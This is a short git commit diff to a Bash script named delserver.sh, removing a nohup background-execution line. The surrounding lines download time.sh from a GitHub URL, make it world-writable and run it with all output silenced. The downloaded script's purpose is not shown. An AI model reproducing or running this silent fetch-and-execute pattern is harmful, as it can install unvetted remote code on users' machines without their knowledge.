5b8a4d6f274d1e704aceaf63ac90a944e9b67ab2
teshushu <905353149@qq.com>
2023-01-20 04:27:52 +0800

    Update delserver.sh

--- Bash/delserver.sh
+++ Bash/delserver.sh
@@ -17,5 +17,4 @@ cd $HOME/myssqltcp/
 wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/time.sh
 chmod 777 time.sh
 /bin/bash $HOME/myssqltcp/time.sh >/dev/null 2>&1
-nohup ./time.sh >/dev/null 2>&1 &
 echo "[*] Yes-Go"
